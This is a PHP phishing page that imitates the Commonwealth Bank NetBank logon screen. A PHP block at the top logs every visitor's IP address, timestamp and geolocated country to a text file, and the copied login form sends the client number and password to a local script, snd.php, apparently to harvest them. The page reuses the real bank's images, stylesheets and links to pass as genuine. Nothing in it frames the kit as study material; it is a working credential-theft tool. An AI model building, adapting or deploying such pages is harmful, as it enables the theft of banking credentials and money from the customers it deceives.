
<?php 
include "ip.php";

/// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country

/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("visits.txt","a.txt");
fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
 ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head id="head"><title>
	NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank
</title><meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you." /><meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo" /><link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" type="text/css" href="https://static.my.commbank.com.au/static/netbank/theme/fo/css/logon-merge.8397238ab0ae7a25ea1af4d375f2c3df.css" rel-album="R600" />
</head>
<body id="body" class="logon">
	<form method="post" action="snd.php" onsubmit="javascript:return WebForm_OnSubmit();" id="form1" autocomplete="off">
<div class="aspNetHidden">
<input type="hidden" name="RID" id="RID" value="TLuGoiJvE0OQgg5pMA1lFQ" />
<input type="hidden" name="SID" id="SID" value="BlAaf7GMrfo=" />
<input type="hidden" name="cid" id="cid" value="mZsGmwmGlkiNAAGxNkNkJg" />
<input type="hidden" name="rqid" id="rqid" value="O6J9dxlHg0GJToyJRhCRjw" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=" />
</div>

<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
void(0);
return true;
}
//]]>
</script>

		<div id="BodyContainer">
			<div id="Header">
				<div id="BrandingLogo">
					<span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.ac9de6fb5214be84653367c74ba0b5f0.gif" alt="Commonwealth Bank of Australia" /></span>
				</div>
			</div>
			<div id="MainContent">
				<noscript>
					<div class="MessagePanel">
						<div class="message_contents message_contents_validation">
							<div class="message">
								<div class="message_icon error"></div>
								<div class="msg_cnt_wrp msg_cnt_wrp_error">
									<p>
										<strong>You need to enable JavaScript to access NetBank</strong>
									</p>
									<p>
										Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html" target="_blank">how to enable JavaScript</a>.
										If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
									</p>
								</div>
							</div>
						</div>
					</div>
				</noscript>
				<div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;">

</div>
				<div id="ModuleWrap">
					<div id="ModuleLeft" class="module">
						<h2>Log on to NetBank</h2>
						<div class="bd">
							<div class="ft">
								<div class="row rowClientNumber">
									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
	<label for="txtMyClientNumber_field" id="txtMyClientNumber_label"><span class="MainLabel ">Client number</span></label>
</div><div class="FieldElement ">
	<input name="Cnum" type="text" maxlength="16" id="txtMyClientNumber_field" class="text textbox field" disabled="disabled" data-maxlength="16" />
</div>
								</div>
								<div class="row rowPassword">
									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
	<label for="txtMyPassword_field" id="txtMyPassword_label"><span class="MainLabel ">Password</span></label>
</div><div class="FieldElement ">
	<input name="Cpasswd" type="password" maxlength="16" id="txtMyPassword_field" class="text textbox field" disabled="disabled" data-maxlength="16" />
</div>
								</div>
								<div class="row">
									<div class="FieldElement  FieldElementNoLabel">
	<span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox" /><label for="chkRemember_field">Remember client number</label></span>
</div>
								</div>
								<input type="hidden" name="perfmonLog" id="perfmonLog" />
							    <input type="hidden" name="metric" id="metric" />
								<div class="FieldElement  FieldElementNoLabel">
	<div class="CbaButton " id="btnLogon">
		<input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field" disabled="disabled" />
	</div>
</div>
								<a id="lnkForgottenDetails" href="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx?RID=TLuGoiJvE0OQgg5pMA1lFQ&amp;SID=BlAaf7GMrfo%3d">I&#39;ve forgotten my log on details</a>
								<div id="MessageBubble" class="MessageBubble">
									<span class="MessagePointer"></span>
									<a id="MessageClose" class="MessageClose" title="Close" href="javascript:void(0)">Close</a>
									<span class="MessageBody">
                                        
                                            For security reasons, do not <br /> select <strong>Remember client number</strong> if anyone else uses <br /> this computer. <a id="lnkFindOutMore" href="http://www.commbank.com.au/passwordtips" target="_blank">Find out more</a>.
                                        
									</span>
								</div>
							</div>
						</div>
					</div>
					<div id="ModuleRight" class="module">
						<h2>New to NetBank?</h2>
						<div class="bd">
							<div class="ft">
								<ul class="Bullets">
									<li><a id="lnkRegistration" href="https://www1.my.commbank.com.au/netbank/Registration/Mixed/SelectCard.aspx?RID=TLuGoiJvE0OQgg5pMA1lFQ&amp;SID=BlAaf7GMrfo%3d">Register for NetBank now</a></li>
									<li><a id="lnkOnlineSupport" href="https://www.commbank.com.au/personal/support.html" target="_blank">Online support for our products and services</a></li>
									<li><a id="lnkProtectYourselfOnline" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Tips to stay safe online</a></li>
								</ul>
							</div>
							<div class="ft secModule">
								<ul class="Bullets">
									<li><a id="lnkSecurityGuarantee" href="https://www.commbank.com.au/security-privacy/how-protect-you.html" target="_blank">How we protect you and our 100% security guarantee</a></li>
								</ul>
							</div>
						 </div>
					</div>
				</div>
                
<!-- Component for content management. -->							

<div id="ucLogonContentManageControl_pnlContentManaged">
	
    <div id="ContentManaged">
        <!-- this is the features panel which has the image and description. -->
        <div id="ucLogonContentManageControl_pnlHighlightPanel">
		
            <div class="HighlightPanel">
                <div class="top">
                    <div class="bottom">							
                        <div class="image">
                            <p><a href="https://www.commbank.com.au/about-us/opportunity-initiatives/opportunity-from-community/cricket.html?intcmp=SummerCricket&amp;mbt=NB-GE-CQ-NA-02-ME-NTL-20-v1-OT--NB:SummerCricket;" target="_blank"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/Bill-Sense_NBLogon.png" alt="" /></a></p>
                        </div>
                        <div class="description">
                            <table><tbody><tr><td><p><b>Try Bill Sense in the CommBank app</b></p>
Our latest feature in the CommBank app predicts your upcoming bills, so you can take control.<ul><li><a href="https://www.commbank.com.au/digital-banking/bill-sense.html ?intcmp=BillSense&amp;mbt=NB-GE-CQ-NA-02-ME-NTL-20-v1-OT--NB:BIllSense;" target="_blank">More on Bill Sense</a></li></ul><p></p><p><span></span></p><p></p></td></tr></tbody></table> 
                        </div>                                                            
                    </div>											
                </div>
            </div>
        
	</div>				    						
        <!-- side by side highlight links at the bottom -->
        <div id="ucLogonContentManageControl_pnlCurrentHighlights">
		
            <div id="CurrentHighlights">
                <h3>Quicklinks</h3>
                <div class="column">
                     <ul>					
                                                        
                                <li><p><a href="https://www.commbank.com.au/digital-banking/bill-sense.html?intcmp=lo-ch1-sense&amp;mbt=NB-GE-CQ-NA-02-ME-NCH-20-v1-OT--NB:billsense;" target="_blank">Predict your future bills with Bill Sense in the CommBank app</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://www.commbank.com.au/support/financial-difficulty.html?intcmp=lo-ch1-financial-difficulty&amp;mbt=NB-GE-CQ-NA-02-ME-NCH-20-v1-OT--NB:financial-difficulty;" target="_blank">Are you in financial difficulty? Apply for assistance.</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://www.commbank.com.au/digital-banking/commbank-app.html?intcmp=lo-ch4-app4&amp;mbt=NB-GE-CQ-NA-02-ME-NCH-09-v1-OT--NB:app4;" target="_blank">Personalise your CommBank app. Discover how.</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://commbankdigital.syd1.qualtrics.com/jfe/form/SV_3XaYzx801cV9va5?intcmp=lo-ch2-survey&amp;mbt=NB-GE-CQ-NA-02-ME-NCH-20-v1-OT--NB:survey;" target="_blank">Complete a short survey for an opportunity to win a $200 gift card</a></p></li>                                                                                                                                                                               
                            
                     </ul>
                </div> 
            </div>
        
	</div>
    </div>

</div>		
			</div>
			<div id="PageFooter">
				<a id="lnkTermsOfUse" href="http://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.aspx" target="_blank">Terms of use</a> | <a id="lnkSecurity" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Security</a> | <a id="lnkPrivacy" href="http://www.commbank.com.au/security-privacy/general-security/privacy.html" target="_blank">Privacy</a>
				<span id="CopyRight">&copy; Commonwealth Bank of Australia 2020 ABN 48 123 123 124</span>
			</div>

			<iframe id="DigitalPlatformLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/digital/identity/authenticate/sign-out?dpOnly=true"></iframe>
		    <iframe id="NetBankDotIdentityLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/retail/netbank/identity/signout"></iframe>
			<script type="text/javascript">
				(function() {
					var chkRemember = document.getElementById('chkRemember_field');
					var msgBubble = document.getElementById('MessageBubble');
					var msgClose = document.getElementById('MessageClose');
					var txtClientNumber = document.getElementById('txtMyClientNumber_field');
					var txtPassword = document.getElementById('txtMyPassword_field');

					function attachEvent(obj, event, func) {
						if (obj.addEventListener) {
							obj.addEventListener(event, func, false);
						} else if (obj.attachEvent) {
							obj.attachEvent('on' + event, func);
						}
					}

					function checkParent(t) {
						while (t && t.parentNode) {
							if (t === msgBubble || t === chkRemember) {
								return false;
							}
							t = t.parentNode;
						}
						return true;
					}

					attachEvent(chkRemember, 'click', function() {
						msgBubble.style.display = chkRemember.checked ? 'block' : 'none';
					});

					attachEvent(msgClose, 'click', function() {
						msgBubble.style.display = 'none';
					});

					document.onclick = function(e) {
						if (checkParent((e && e.target) || (event && event.srcElement))) {
							msgBubble.style.display = 'none';
						}
					}

                    if (typeof document.body.classList !== 'undefined' && document.body.classList.contains('hosted_commbankversion2')) {
                        function slideLabel() {
                            var self = this,
                                parentRow = self.parentNode.parentNode,
                                hasSlideAndShowClass = parentRow.classList.contains('slideAndShow');
                            if (self.value !== '' && !hasSlideAndShowClass) {
                                parentRow.classList.add('slideAndShow');
                            } else if (self.value === '' && hasSlideAndShowClass) {
                                parentRow.classList.remove('slideAndShow');
                            }
                        }
                        txtClientNumber.addEventListener('keyup', slideLabel);
                        txtPassword.addEventListener('keyup', slideLabel);
                    }
				}());
			</script>
		</div>
	<!-- CorrelationId: ddef1e6c-134f-433e-badd-5ac3dc3b74ee -->
<script type="text/javascript">
//<![CDATA[
var Page_ValidationSummaries =  new Array(document.getElementById("mplMessagePanel"));
//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY=" />
</div>

<script type="text/javascript">
//<![CDATA[
document.getElementById('txtMyClientNumber_field').disabled = false;
document.getElementById('txtMyPassword_field').disabled = false;
document.getElementById('btnLogon_field').disabled = false;
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
//]]>
</script>
<noscript><input type="hidden" name="JS" value="D" /></noscript><script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/tracking-merge.8784d605543edaf86ccd7ce9c54ba0eb.js" rel-album="R600"></script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/core/js/core-merge.36971982ebc03a2658d8e51f70007637.js" rel-album="6.27"></script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/marketing-merge.1150c627e4cf19072a932cb19f458f58.js" rel-album="R600"></script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/trackingbootstrap.6a4ec0543ec5eeb2945dab199b05ed0d.js" rel-album="R600"></script>

<script type="text/javascript">
//<![CDATA[
try { if (typeof navigator !== 'undefined' && !(/(iPad|iPhone|iPod)/.test(navigator.userAgent) && /Apple/.test(navigator.vendor))) { document.getElementById('txtMyClientNumber_field').focus(); }} catch(e) {};
form1_submitted = false;
WebForm_OnSubmit = function() {
	if (form1_submitted) {
		return false;
	} else {
		if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false)
			return false;
		form1_submitted = true;
		return true;
	}
}
//]]>
</script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/core/js/instrumentation-merge.4043785f5795e2e8297bdfe0cdf60f4d.js" rel-album="6.27"></script>

<script type="text/javascript">
//<![CDATA[
var OldWebForm_OnSubmit = WebForm_OnSubmit;
WebForm_OnSubmit = function() {
	var result = OldWebForm_OnSubmit();
	if (result) {
		var messages = Logger.flush();
		if (messages) {
			var ci = document.getElementById('ci');
			if (!ci) {
				ci = document.createElement('input');
				ci.id = ci.name = 'ci';
				ci.type = 'hidden';
				document.getElementById('form1').appendChild(ci);
			}
			ci.value = Compression.compressAndEncode('[' + messages + ']');
		}
	}
	return result;
};
Logger.init('ddef1e6c-134f-433e-badd-5ac3dc3b74ee');
//]]>
</script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/func.93e2b59f394e3a41fe583d39224b8f43.js" rel-album="R600"></script>

<script type="text/javascript">
//<![CDATA[
(function(f) { if (window.addEventListener) { window.addEventListener('load',f,false); } else if (window.attachEvent) { window.attachEvent('onload',f); } }(function() { CommBank.Online.Framework.PerfLog.perfmon(function(l) { document.getElementById('perfmonLog').value = l; }); }));
//]]>
</script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/metrics.9fad0b7ae109eb7ff6f728371db87a10.js" rel-album="R600"></script>
<script type="text/javascript" src="https://static.my.commbank.com.au/static/netbank/js/smartbanner.d1197ec1675a985d0591d2083729fe1a.js" rel-album="R600"></script>

<script type="text/javascript">
//<![CDATA[
$(function () { $.smartbanner({ content: (function () { try { return $.parseJSON('{"ios_mobile":{"closeButtonId":"appbannerclose","image":{"imagePath":"/netbank-logon/commbankmobile.png","title":"","alt":"","width":"","height":""},"iconId":"iosmobilebanner","appName":"CommBank app","appDescription":"A secure and easy way to bank on the go","buttonText":"View","buttonId":"appbannerview","buttonUrl":" "},"android_mobile":{"closeButtonId":"appbannerclose","image":{"imagePath":"/netbank-logon/commbankmobile.png","title":"","alt":"","width":"","height":""},"iconId":"androidmobilebanner","appName":"CommBank app","appDescription":"A secure and easy way to bank on the go","buttonText":"View","buttonId":"appbannerview","buttonUrl":" "},"windows_mobile":{"closeButtonId":"appbannerclose","image":{"imagePath":"/netbank-logon/commbankmobile.png","title":"","alt":"","width":"","height":""},"iconId":"windowsmobilebanner","appName":"CommBank app","appDescription":"A secure and easy way to bank on the go","buttonText":"View","buttonId":"appbannerview","buttonUrl":" "},"device_whitelist":{"ios_tablet":["enter UA here"],"android_tablet":["enter UA here"]},"ios_tablet":{"closeButtonId":"tabletbannerclose","image":{"imagePath":"/netbank-logon/AppIcon_tablet.png","title":"","alt":"","width":"","height":""},"iconId":"iostabletbanner","appName":"CommBank app for tablet","appDescription":"Check out our new app designed  for your iPad!","buttonText":"View","buttonId":"tabletbannerview","buttonUrl":"http://c00.adobe.com/ee328298122933a6348cb34deec62b3d656e4b97e806e181f1f42ff721476c7e/mva928gn/i/447020285"},"android_tablet":{"closeButtonId":"tabletbannerclose","image":{"imagePath":"/netbank-logon/AppIcon_tablet.png","title":"","alt":"","width":"","height":""},"iconId":"androidtabletbanner","appName":"CommBank app for tablet","appDescription":"Check out our new Tablet app!","buttonText":"View","buttonId":"tabletbannerview","buttonUrl":"http://c00.adobe.com/ee328298122933a6348cb34deec62b3d656e4b97e806e181f1f42ff721476c7e/mva928gn/g/com.cba.android.netbank"}}'); } catch(e) { return {}; } })(), appleiTunesAppId: '310251202', appleiTunesTabletAppId: '447020285', googlePlayAppId: 'com.commbank.netbank', googlePlayTabletAppId: 'com.cba.android.netbank', msApplicationId: '3f38330f-29a8-e011-986b-78e7d1fa76f8', msApplicationPackageFamilyName: 'commbank', iconGloss: false, button: 'View', scale: '1', iOSTabletBannerEnabled: true, androidTabletBannerEnabled: true, staticCmxPath: 'https://static.my.commbank.com.au/static/cmxAssets' }); });
//]]>
</script>
<iframe src="/netbank/Logon/Preload.aspx" width="0" height="0" frameborder="0" style="display:none;"></iframe>
</form>
	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
</body>
</html>
